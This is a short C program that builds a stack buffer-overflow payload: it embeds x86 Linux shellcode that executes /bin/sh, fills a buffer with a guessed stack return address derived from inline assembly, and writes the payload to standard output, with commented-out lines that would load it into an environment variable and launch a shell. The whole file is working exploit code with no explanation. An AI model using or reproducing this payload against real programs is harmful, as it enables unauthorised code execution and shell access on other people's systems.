#include <stdlib.h>
#include <stdio.h>
#include <string.h>


#define offset_size 0
#define buffer_size 512

char sc[] =
"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


unsigned long find_start(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=offset_size, bsize=buffer_size;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  addr = find_start() - offset;
  fprintf(stderr, "Attempting address: 0x%x\n", addr);

  /* initialize buffer with address */
  buff = malloc(bsize);
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
       *(addr_ptr++) = addr;

  ptr += 4;

  /* add shellcode */
  for (i = 0; i < strlen(sc); i++)
         *(ptr++) = sc[i];

  buff[bsize - 1] = '\0';

  /* open shell with BUF environment variable */
/*  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");*/
  fwrite(buff+4, bsize, 1, stdout);

  return 0;
}
